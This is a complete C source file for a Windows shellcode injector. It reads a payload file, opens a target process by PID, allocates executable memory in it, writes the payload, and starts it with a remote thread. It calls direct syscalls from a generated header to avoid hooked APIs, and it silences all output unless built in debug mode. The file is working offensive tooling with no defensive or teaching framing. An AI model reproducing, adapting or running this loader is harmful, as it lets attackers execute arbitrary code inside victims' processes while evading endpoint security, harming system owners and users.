#include <windows.h>
#include "syscalls.h" // Import the generated header.
#include <stdio.h>
#include <stdlib.h>
#include "resource.h"

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

HANDLE Target(DWORD dwPid)
{
    HANDLE hProc;
    OBJECT_ATTRIBUTES objAttr;
    CLIENT_ID cID;

    cID.UniqueProcess = (PVOID)dwPid;
    cID.UniqueThread = 0;

    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    NTSTATUS STATUS = NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &objAttr, &cID);

    if (!NT_SUCCESS(STATUS)) {
#ifdef DEBUG
        printf("[!] NtOpenProcess Failed With Status : 0x%8lx \n", STATUS);
#endif
        return NULL;
    }

    return hProc;
}

VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {
    printf("unsigned char %s[] = {", Name);
    for (int i = 0; i < Size; i++) {
        if (i % 16 == 0)
            printf("\n\t");

        if (i < Size - 1) {
            printf("0x%0.2X, ", Data[i]);
        }
        else {
            printf("0x%0.2X ", Data[i]);
        }
    }

    printf("};\n\n\n");
}

char* Load(const char* filePath, SIZE_T* fileSize) {
    FILE* filePointer;

    // Open the binary file in read mode
    fopen_s(&filePointer, filePath, "rb");

    // Check if the file was successfully opened
    if (filePointer == NULL) {
#ifdef DEBUG
        fprintf(stderr, "[-] Error opening the file.\n");
#endif
        return NULL; // Return NULL to indicate failure
    }

    // Move the file position indicator to the end of the file
    fseek(filePointer, 0, SEEK_END);

    // Get the total size of the file
    *fileSize = ftell(filePointer);

    // Move the file position indicator back to the beginning of the file
    rewind(filePointer);

    // Allocate memory to hold the file contents
    char* fileData = malloc(*fileSize);
    if (!fileData) {
#ifdef DEBUG
        fprintf(stderr, "[-] Error allocating memory.\n");
#endif
        fclose(filePointer);
        return NULL; // Return NULL to indicate failure
    }

    // Read the entire file into the allocated memory
    fread((void*)fileData, *fileSize, 1, filePointer);

    // Close the file
    fclose(filePointer);
    return fileData;
}


void Inject(const HANDLE hProcess, const char* code, SIZE_T size)
{
    HANDLE hThread = NULL;
    LPVOID lpAllocationStart = NULL;
    SIZE_T szAllocationSize = size;

#ifdef DEBUG
    printf("[?] Allocating %lld bytes of memory\n", szAllocationSize);
#endif

    NTSTATUS STATUS = NtAllocateVirtualMemory(hProcess, &lpAllocationStart, 0, &szAllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(STATUS)) {
#ifdef DEBUG
        printf("[!] NtAllocateVirtualMemory Failed With Status : 0x%8lx \n", STATUS);
#endif
        return;
    }

#ifdef DEBUG
    printf("\t[+] Allocated %lld bytes of memory in %p\n", szAllocationSize, lpAllocationStart);
    printf("[?] Writting virtual memory\n");
#endif

    SIZE_T written = 0;
    STATUS = NtWriteVirtualMemory(hProcess, lpAllocationStart, (PVOID)code, size, &written);
    if (!NT_SUCCESS(STATUS) || !written) {
#ifdef DEBUG
        printf("[!] NtWriteVirtualMemory Failed With Status : 0x%8lx \n", STATUS);
#endif
        return;
    }

#ifdef DEBUG
    printf("\t[+] Written %lld bytes\n", written);
    printf("[?] Creating new thread\n");
#endif

    STATUS = NtCreateThreadEx(&hThread, GENERIC_ALL, NULL, hProcess, (LPTHREAD_START_ROUTINE)lpAllocationStart, NULL, FALSE, 0, 0, 0, NULL);
    if (!NT_SUCCESS(STATUS)) {
#ifdef DEBUG
        printf("[!] NtWriteVirtualMemory Failed With Status : 0x%8lx \n", STATUS);
#endif
        return;
    }

    if (hThread) {
#ifdef DEBUG
        printf("\t[+] New thread created at %p\n", hThread);
        printf("[?] Waiting for thread\n");
#endif
        DWORD dwWaitReturn = WaitForSingleObject(hThread, INFINITE);
#ifdef DEBUG
        if (dwWaitReturn != WAIT_OBJECT_0) {
            printf("[!] WaitForSingleObject Failed with Status: 0x%8lx\n", dwWaitReturn);
        }
        else printf("\t[+] Thread exited successfully\n");
        printf("[?] Closing thread\n");
#endif
        if (!CloseHandle(hThread)) {
#ifdef DEBUG
            printf("[-] Closing thread handle failed\n");
#endif
            return;
        }
#ifdef DEBUG
        printf("\t[+] Closed thread handle\n");
#endif
    }
}


int main(int argc, char** argv) {
    if (argc == 1) {
#ifdef DEBUG
        printf("[-] Missing pid or file\n");
#endif
        return -1;
    }

    int pid = atoi(argv[1]);
    char* path = argv[2];
    SIZE_T size;

    char* code = Load(path, &size);
    if (!code) return -1;

    HANDLE hProc = Target(pid);
    if (!hProc) return -1;

#ifdef DEBUG
    printf("Process Handle: %p\n", hProc);
#endif

    Inject(hProc, code, size);

#ifdef DEBUG
    printf("[?] Closing handle\n");
#endif

    if (!CloseHandle(hProc)) {
#ifdef DEBUG
        printf("[-] Closing process handle failed\n");
#endif
        return -1;
    }
    
#ifdef DEBUG
    printf("\t[+] Closed process handle\n");
#endif
    return 1;
}